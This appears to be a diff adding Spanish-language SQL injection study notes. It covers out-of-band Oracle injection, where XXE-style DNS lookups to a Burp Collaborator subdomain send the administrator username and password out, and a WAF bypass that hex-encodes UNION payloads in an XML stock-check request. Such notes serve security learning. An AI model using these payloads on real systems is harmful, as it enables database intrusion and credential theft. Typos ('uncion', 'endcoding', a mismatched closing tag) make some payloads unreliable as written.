@@ -354,3 +354,110 @@ Cookie: TrackingId=R6IxX1tiUucyn6LL' and (select 'a' from users where username='
 --? CookieTrackingId=q3XzfKFtNBf4dtNv'|| (select case when substring(username,1,1)='a' then pg_sleep(10) else pg_sleep(0) end
 --? from users where username='administrator')
 
+--! Out of band interaction
+
+--* Esto es en el caso de que ninguna de las injecciones anteriores aplique, se trata de realizar un DNS lookup (cheat sheet), mezcla entre
+--* sqli y xxe --> xml external entity
+--* A travez del burpsuite colaborator filtrar datos
+
+--* En burpsuite, arriba a la derecha, clickeamos en burp y seleccionamos burpsuite colaborator.
+
+--* Enviamos el out of band:
+
+--?     SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM 
+--?    "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+
+--* En BURP-COLLABORATOR-SUBDOMAIN lo remplazamos por el subdomain que nos da burpsuite --> (professional $)
+
+--* URLENCODEAMOD la url, y en el burpsuite colaborator al hacer un poll podriamos llegar a ver una peticion
+
+--? CookieTrackingId=q3XzfKFtNBf4dtNv'
+
+--* DNS lookup con exfiltración de data. Como subdominio del burpsuite colaborator, va a ser dinamico y va a estar representada
+--* la data que queramos filtrar
+
+--?   SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'
+--?   ||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual 
+
+--* En la sig query estariamos pidiendo el username de la tabla users donde el usuario es administrador, por lo que devolveria
+--* administrador, pero...donde?
+
+--?   SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'
+--?   ||(select username from users where username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual 
+
+--* Respuesta en el poll de burpsuite colaborator
+--todo ---> The colaborator server received a DNS lookup of type aA for the domain name administrator.BURP-COLLABORATOR-SUBDOMAIN
+
+--?   SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'
+--?   ||(select password from users where username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+
+--* Respuesta en el poll de burpsuite colaborator
+-- ejemplo de password: (hshfgasdub231)
+--todo ---> The colaborator server received a DNS lookup of type aA for the domain name hshfgasdub231.BURP-COLLABORATOR-SUBDOMAIN
+
+-- Alternativa a no tener el burpsuite profesional:
+-- Un scripting apuntando a un servicio ofrecido por nosotros, ofreciendo un servicio http y extrayendo la respuesta dns
+
+--! SQL Injection Bypass via XML encoding
+
+--* Interceptamos la peticion y vemos que se tramita una petición con estructura de XML
+
+<?xml version="1.0" endcoding="UTF-8"?>
+    <stockCheck>
+        <productId>
+            2    
+        </productId>
+        <storeId>
+            1
+        </storeId>
+    </stcokCheck>
+
+        |
+        |
+        |
+        v
+
+<?xml version="1.0" endcoding="UTF-8"?>
+    <stockCheck>
+        <productId>
+            2    
+        </productId>
+        <storeId>
+            1 uncion select NULL-- -
+        </storeId>
+    </stcokCheck>
+
+
+--* Esto puede estar contemplado por lo que habria que burlar el waff, existen tecnicas de bypassing para estructuras xml como esta
+
+--* En burpsuite, extender ----> hackvertor
+
+--* En el repeater seleccionamos la query, click derecho, Extensions, Hackvertor y encodear las cosas, en este caso para crear una
+--* entidad de xml
+
+<?xml version="1.0" endcoding="UTF-8"?>
+    <stockCheck>
+        <productId>
+            2    
+        </productId>
+        <storeId>
+            <@/hex_entities>
+                1 uncion select schema_name from information_schema.schemata-- -
+            <@/hex_entities>
+        </storeId>
+    </stcokCheck>
+
+--* De esta manera podriamos terminar dumpeando contenidos de la tabla de una base de datos una vez descubierto las dbs, las tablas
+--* y las columnas 
+
+<?xml version="1.0" endcoding="UTF-8"?>
+    <stockCheck>
+        <productId>
+            2    
+        </productId>
+        <storeId>
+            <@/hex_entities>
+                1 uncion select username||':'||password from users where username='administrator'-- -
+            <@/hex_entities>
+        </storeId>
+    </stcokCheck>
